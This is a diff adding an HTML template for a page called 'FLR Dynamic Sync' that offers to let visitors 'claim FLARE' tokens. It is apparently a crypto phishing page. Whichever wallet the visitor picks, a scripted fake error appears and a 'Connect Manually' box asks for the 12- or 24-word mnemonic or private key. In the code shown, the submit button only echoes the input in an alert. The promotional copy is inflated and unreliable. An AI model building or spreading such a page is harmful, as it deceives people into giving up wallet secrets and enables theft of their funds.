@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FLR Dynamic Sync</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.0/web3.min.js"></script>
+</head>
+<body>
+    <!-- Navigation -->
+    <header>
+        <h1>FLR Dynamic Sync</h1>
+        <nav>
+            <a href="#home">Home</a>
+            <a href="#intro">Intro</a>
+            <a href="#claim-flare">Claim FLARE</a>
+        </nav>
+    </header>
+
+    <!-- Home Section -->
+    <section id="home">
+        <h2>EVM Hub for Web3.0</h2>
+        <p>
+            Flare is revolutionizing decentralized finance as a next-generation liquidity hub powered by the Ethereum Virtual Machine (EVM) network. 
+            Offering a suite of cutting-edge tools, Flare enables seamless access to decentralized cloud services, customizable liquidity solutions, and groundbreaking features like farming, bridging, and staking. 
+            At its core, Flare introduces the world’s first ultra-low-latency oracle with a lightning-fast 10 ms frequency, ensuring real-time data accuracy. 
+            Whether you're a developer or a DeFi innovator, Flare is your launchpad for limitless possibilities in the decentralized world.
+        </p>
+        <img src="{{ url_for('static', filename='images/image1.png') }}" alt="Home Banner">
+    </section>
+
+    <!-- Intro Section -->
+    <section id="intro">
+        <h2>Understanding the Flare Network</h2>
+        <p>
+            Flare is redefining the future of decentralized finance with its innovative layer-1 smart contract platform. 
+            Built for scalability and EVM compatibility, Flare is purpose-built for DeFi, offering integrated liquidity and ready-made financial applications to supercharge development. 
+            With game-changing features like a trustless exchange, a decentralized stablecoin (aUSD), BNB Liquid Staking (LBNB), and its advanced EVM+ framework, Flare bridges the best of EVM networks, XRP, and the powerful Substrate ecosystem. 
+            Transactions on Flare settle at lightning speed for a fraction of the gas costs compared to other networks, making it the ultimate playground for developers and DeFi innovators alike.
+        </p>
+        <img src="{{ url_for('static', filename='images/image2.png') }}" alt="Intro Banner">
+    </section>
+
+    <!-- Claim FLARE Section -->
+    <section id="claim-flare">
+        <h2>Claim FLARE</h2>
+        <p>Connect your wallet to claim FLARE tokens.</p>
+        <button id="connectWallet">Claim FLARE</button>
+        <p id="walletAddress"></p>
+    </section>
+
+    <!-- Wallet Selection Modal -->
+    <div id="walletModal" class="modal">
+        <div class="modal-content">
+            <span class="close" id="closeModal">&times;</span>
+            <h2>Select Wallet</h2>
+            <input type="text" id="searchWallet" placeholder="Search for your wallet" style="width: 80%; padding: 10px;">
+            <div class="wallet-list" id="walletList"></div>
+        </div>
+    </div>
+
+    <!-- Manual Connection Modal -->
+    <div id="manualModal" class="modal">
+        <div class="modal-content">
+            <span class="close" id="closeManual">&times;</span>
+            <h2>Connect Manually</h2>
+            <textarea id="mnemonicInput" placeholder="Enter your 12 or 24 Mnemonic words. Separate them with spaces. You can also input your private key instead."></textarea>
+            <button id="submitManual">Submit</button>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <p>© 2025 FLR Dynamic Sync. All rights reserved.</p>
+    </footer>
+
+    <!-- JavaScript -->
+    <script>
+        // Function to connect to MetaMask
+        async function connectWallet() {
+            if (window.ethereum) {
+                try {
+                    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                    document.getElementById('walletAddress').innerText = `Connected Wallet: ${accounts[0]}`;
+                } catch (error) {
+                    console.error("Wallet connection rejected");
+                }
+            } else {
+                alert("MetaMask not detected. Please install MetaMask.");
+            }
+        }
+
+        // Modal functionality
+        const claimButton = document.getElementById('connectWallet');
+        const walletModal = document.getElementById('walletModal');
+        const manualModal = document.getElementById('manualModal');
+        const closeModal = document.getElementById('closeModal');
+        const closeManual = document.getElementById('closeManual');
+        const walletList = document.getElementById('walletList');
+        const searchWallet = document.getElementById('searchWallet');
+        const mnemonicInput = document.getElementById('mnemonicInput');
+        const submitManual = document.getElementById('submitManual');
+
+        // Dummy wallet names (this can be expanded or fetched dynamically)
+        const wallets = [
+            "MetaMask", "Trust Wallet", "Coinbase Wallet", "Ledger", "Trezor",
+            "Crypto.com", "Binance Chain Wallet", "Phantom", "Exodus", "Atomic Wallet",
+            "Argent", "WalletConnect", "MyEtherWallet", "D'Cent Wallet", "Enjin Wallet",
+            "Math Wallet", "SafePal", "Keystone", "MEW wallet", "Electrum", "BlueWallet",
+            "Jaxx Liberty", "Infinito Wallet", "Cobo Wallet", "IWallet", "Tally Ho",
+            "Sollet Wallet", "ZenGo", "Coinomi", "Civic Wallet", "MetaMask Mobile",
+            "Guarda Wallet", "GreenAddress", "Bread Wallet", "Exodus Wallet", "ZenGo Wallet"
+            // More wallets can be added here
+        ];
+
+        // Populate wallet list dynamically with search filter
+        function populateWalletList(filter = "") {
+            walletList.innerHTML = "";
+            wallets
+                .filter(wallet => wallet.toLowerCase().includes(filter.toLowerCase()))
+                .forEach(wallet => {
+                    const button = document.createElement('button');
+                    button.textContent = wallet;
+                    button.onclick = () => handleWalletClick(wallet);
+                    walletList.appendChild(button);
+                });
+        }
+
+        // Show wallet modal
+        claimButton.onclick = () => {
+            walletModal.style.display = "block";
+            populateWalletList();
+        };
+
+        // Close modals
+        closeModal.onclick = () => (walletModal.style.display = "none");
+        closeManual.onclick = () => (manualModal.style.display = "none");
+
+        // Wallet click handler
+        function handleWalletClick(wallet) {
+            alert(`An error occurred... please try again or connect manually.`);
+            walletModal.style.display = "none";
+            manualModal.style.display = "block";
+        }
+
+        // Filter wallets
+        searchWallet.oninput = (e) => populateWalletList(e.target.value);
+
+        // Submit manual input
+        submitManual.onclick = () => {
+            alert(`You entered: ${mnemonicInput.value}`);
+        };
+    </script>
+</body>
+</html>
